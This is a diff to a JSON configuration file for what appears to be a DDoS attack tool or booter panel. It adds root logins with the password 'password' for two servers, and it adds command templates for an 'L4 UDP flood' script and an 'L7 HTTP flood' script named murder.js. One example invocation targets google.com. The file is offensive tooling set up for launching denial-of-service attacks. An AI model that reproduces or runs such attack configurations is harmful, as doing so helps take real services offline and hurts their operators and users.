@@ -1,8 +1,26 @@
 {
 	"servers" : [
 		{
-		    "link" : "",
-		    "authentication" : ""
+			"host" : "192.168.1.1",
+			"user" : "root",
+			"password" : "password"
+		},
+		{
+			"host" : "192.168.1.2",
+			"user" : "root",
+			"password" : "password"
+		}
+	],
+	"methods" : [
+		{
+			"name" : "udp",
+			"command" : "node udp_flooder.js -i %1target1% -p %1port1% -t %1duration1% -m 1",
+			"description" : "L4 Node UDP ICMP Flood Attack (-ddos 192.168.1.1 80 60 udp)"
+		},
+		{
+			"name" : "murder",
+			"command" : "node murder.js %1target1% %1duration1%",
+			"description" : "L7 Node HTTP Flood Attack (-ddos http://google.com/ 0 60 murder)."
 		}
 	]
 }
